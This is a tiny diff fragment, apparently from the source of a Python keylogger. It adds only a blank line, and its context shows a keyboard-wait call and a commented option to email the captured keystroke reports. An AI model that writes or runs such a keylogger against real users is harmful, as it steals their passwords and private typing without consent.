@@ -104,6 +104,7 @@ class Keylogger:
         keyboard.wait()
 
 
+
 if __name__ == "__main__":
     # if you want a keylogger to send to your email
     # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
